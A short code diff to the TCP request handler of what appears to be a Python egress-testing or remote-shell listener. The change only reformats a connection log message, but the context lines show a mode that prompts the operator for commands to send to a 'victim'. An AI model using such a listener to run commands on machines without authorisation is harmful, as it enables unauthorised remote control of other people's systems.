@@ -62,7 +62,7 @@ class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
             self.request.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)[:8]
         )[1]  # (proto, port, IPa, IPb, IPc, IPd)
         self.data = self.request.recv(1024).strip()
-        print("[*] Connected from %s on TCP port %d: client reported %s" % (self.client_address[0], port, self.data))
+        print("[*] Connected from %s on port: TCP %d (client reported %s)" % (self.client_address[0], port, self.data))
         if shell == "shell":
             while running:
                 request = raw_input("Enter the command to send to the victim: ")
